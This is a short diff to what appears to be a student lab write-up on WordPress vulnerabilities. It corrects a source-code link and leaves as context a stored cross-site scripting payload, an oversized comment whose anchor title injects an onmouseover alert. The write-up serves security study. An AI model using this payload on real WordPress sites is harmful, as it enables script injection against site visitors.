@@ -41,7 +41,7 @@ Time spent: **8** hours spent in total
     - Paste the following text in a comment: ```<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>```
     - Make sure the character length is 64kb or more.
   - [X] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/trunk/src/wp-admin/comment.php)
+    - [Link 1](https://core.trac.wordpress.org/browser/trunk/src/wp-includes/comment.php)
 4. (Optional) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
